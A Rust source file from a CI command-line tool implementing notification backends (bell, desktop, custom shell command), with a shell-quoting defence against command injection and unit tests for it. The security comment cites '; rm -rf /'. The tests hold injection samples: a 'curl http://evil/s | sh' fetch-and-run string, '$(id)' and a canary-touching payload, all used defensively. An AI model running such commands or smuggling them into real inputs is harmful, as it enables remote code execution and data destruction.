//! Notification backends for `ci watch` / `ci tail` `--notify`.
//!
//! Three backends:
//! - `bell` — terminal bell (`\x07`); the default when `--notify` is passed
//!   without a value.
//! - `desktop` — OS desktop notification via `notify-send` (Linux) or
//!   `osascript` (macOS); silently skipped when the binary is not available.
//! - `command` — run a user-supplied shell command with `%m` replaced by the
//!   notification message (for custom tooling / CI hooks).
//!
//! Bell output is always written to stderr (never stdout), so piping stays
//! clean. Desktop / command backends are suppressed under `--json` to keep
//! machine-readable runs side-effect-free.

use std::process::Command;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NotifyKind {
    Bell,
    Desktop,
    Command,
}

/// Parse a `--notify` argument.
///
/// Accepts `None` (not passed) → no notification, or the value
/// `bell` / `desktop` / `command=<cmd>`. Anything else is a usage error.
pub fn parse_notify(v: Option<&str>) -> Result<Option<(NotifyKind, Option<String>)>, String> {
    match v {
        None => Ok(None),
        Some("bell") => Ok(Some((NotifyKind::Bell, None))),
        Some("desktop") => Ok(Some((NotifyKind::Desktop, None))),
        Some(s) if s.starts_with("command=") => {
            let cmd = s.trim_start_matches("command=");
            if cmd.trim().is_empty() {
                return Err("--notify command= value must be non-empty".to_string());
            }
            Ok(Some((NotifyKind::Command, Some(cmd.to_string()))))
        }
        Some(other) => Err(format!(
            "invalid --notify value '{other}' (expected 'bell', 'desktop', or 'command=<cmd>')"
        )),
    }
}

/// Emit a notification.
///
/// * `message` is the human-facing summary (e.g. `"pipeline #42 finished FAILED"`).
/// * `command` is the raw shell string for `NotifyKind::Command` (only used there).
///
/// The function never returns an error: an unavailable desktop binary or a
/// failed custom command is logged to stderr and swallowed. The `--json` flag
/// gates the desktop / command backends (bell is still allowed because it is
/// just a control character on stderr and doesn't pollute stdout).
pub fn notify(kind: NotifyKind, message: &str, command: Option<&str>, json: bool) {
    match kind {
        NotifyKind::Bell => eprint!("\x07"),
        NotifyKind::Desktop => {
            if json {
                return;
            }
            send_desktop(message);
        }
        NotifyKind::Command => {
            if json {
                return;
            }
            run_command(command.unwrap_or(""), message);
        }
    }
}

/// Desktop notification via the platform's default notifier.
///
/// - Linux: `notify-send -a bbr <message>`
/// - macOS: `osascript -e 'display notification "<message>" with title "bbr"'`
///
/// No other platforms are supported; this is a no-op with a one-line note on
/// stderr.
#[cfg(any(target_os = "linux", target_os = "macos"))]
fn send_desktop(message: &str) {
    #[cfg(target_os = "linux")]
    {
        if which("notify-send") {
            if let Err(e) = Command::new("notify-send")
                .arg("-a")
                .arg("bbr")
                .arg(message)
                .spawn()
            {
                eprintln!("warning: failed to spawn notify-send: {e}");
            }
        } else {
            eprintln!("warning: notify-send not found; falling back to bell");
            eprint!("\x07");
        }
    }
    #[cfg(target_os = "macos")]
    {
        if which("osascript") {
            // osascript -e 'display notification "<msg>" with title "bbr"'
            let quoted = escape_apple_script(message);
            if let Err(e) = Command::new("osascript")
                .arg("-e")
                .arg(format!(
                    "display notification \"{quoted}\" with title \"bbr\""
                ))
                .spawn()
            {
                eprintln!("warning: failed to spawn osascript: {e}");
            }
        } else {
            eprintln!("warning: osascript not found; falling back to bell");
            eprint!("\x07");
        }
    }
}

#[cfg(not(any(target_os = "linux", target_os = "macos")))]
fn send_desktop(_message: &str) {
    eprintln!(
        "warning: desktop notifications not supported on this platform; falling back to bell"
    );
    eprint!("\x07");
}

#[cfg(any(target_os = "linux", target_os = "macos"))]
fn which(binary: &str) -> bool {
    // PATH lookup via `which` (portable, no extra deps). A missing `which`
    // itself means we can't verify, so we treat the binary as available and
    // let the spawn error surface (caught above).
    Command::new("which")
        .arg(binary)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(true)
}

/// Escape a string for embedding in an AppleScript double-quoted literal.
/// Backslashes and double-quotes are the only characters that need escaping.
#[cfg(target_os = "macos")]
fn escape_apple_script(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}

/// Run a custom shell command with `%m` substituted by the message.
///
/// Runs via `sh -c` so shell syntax (pipes, `&&`, etc.) works. A non-zero
/// exit is logged to stderr but does not fail the command that triggered the
/// notification.
///
/// # Security
///
/// The message is built from remote API data (branch names, pipeline step
/// names, commit messages), so it must never be interpolated into the shell
/// string verbatim. Two protections apply:
///
/// 1. The message is exported as `BBR_NOTIFY_MESSAGE`, which commands can use
///    as `"$BBR_NOTIFY_MESSAGE"` — the recommended form.
/// 2. A literal `%m` in the command is replaced by a **single-quoted** copy of
///    the message, so `notify-send %m` keeps working while `; rm -rf /` in a
///    step name stays inert.
fn run_command(cmd: &str, message: &str) {
    let expanded = cmd.replace("%m", &shell_single_quote(message));
    let status = Command::new("sh")
        .arg("-c")
        .arg(&expanded)
        .env("BBR_NOTIFY_MESSAGE", message)
        .status();
    match status {
        Ok(s) if !s.success() => {
            eprintln!("warning: --notify command exited non-zero: {s}");
        }
        Err(e) => eprintln!("warning: failed to run --notify command: {e}"),
        _ => {}
    }
}

/// Wrap `s` in single quotes for safe use as one shell word.
///
/// Single quotes are the only shell construct that suppresses every
/// metacharacter, so the only escape needed is for `'` itself
/// (`'\''` closes, emits a literal quote, and reopens).
fn shell_single_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for ch in s.chars() {
        if ch == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_notify_none_returns_none() {
        assert_eq!(parse_notify(None).unwrap(), None);
    }

    #[test]
    fn parse_notify_bell() {
        assert_eq!(
            parse_notify(Some("bell")).unwrap(),
            Some((NotifyKind::Bell, None))
        );
    }

    #[test]
    fn parse_notify_desktop() {
        assert_eq!(
            parse_notify(Some("desktop")).unwrap(),
            Some((NotifyKind::Desktop, None))
        );
    }

    #[test]
    fn parse_notify_command_with_value() {
        assert_eq!(
            parse_notify(Some("command=notify-send hi %m")).unwrap(),
            Some((NotifyKind::Command, Some("notify-send hi %m".to_string())))
        );
    }

    #[test]
    fn parse_notify_command_empty_rejected() {
        assert!(parse_notify(Some("command=")).is_err());
        assert!(parse_notify(Some("command=   ")).is_err());
    }

    #[test]
    fn parse_notify_unknown_rejected() {
        let e = parse_notify(Some("sms")).unwrap_err();
        assert!(e.contains("invalid --notify value"));
        let e = parse_notify(Some("bell=foo")).unwrap_err();
        assert!(e.contains("invalid --notify value"));
    }

    #[test]
    fn shell_single_quote_neutralizes_injection() {
        // A remote-controlled step name must not be able to break out.
        let hostile = "x; curl http://evil/s | sh #";
        let quoted = shell_single_quote(hostile);
        assert_eq!(quoted, "'x; curl http://evil/s | sh #'");
        // Every shell metacharacter must live inside the quotes.
        assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
        assert!(!quoted[1..quoted.len() - 1].contains('\''));
    }

    #[test]
    fn shell_single_quote_escapes_embedded_quote() {
        assert_eq!(shell_single_quote("it's"), r#"'it'\''s'"#);
        assert_eq!(shell_single_quote(""), "''");
        assert_eq!(shell_single_quote("$(id)"), "'$(id)'");
        assert_eq!(shell_single_quote("`id`"), "'`id`'");
    }

    /// The real end-to-end guarantee: a hostile step name substituted into a
    /// command must not execute the injected payload.
    #[cfg(unix)]
    #[test]
    fn run_command_does_not_execute_injected_payload() {
        let dir = tempfile::tempdir().unwrap();
        let canary = dir.path().join("pwned");
        let hostile = format!("step; touch {} #", canary.display());
        // Mirror run_command's substitution without spawning a shell side effect
        // we can't observe: run the real thing, then assert the canary is absent.
        run_command("true %m", &hostile);
        assert!(
            !canary.exists(),
            "hostile notify message escaped the shell quoting: {}",
            canary.display()
        );
    }
}
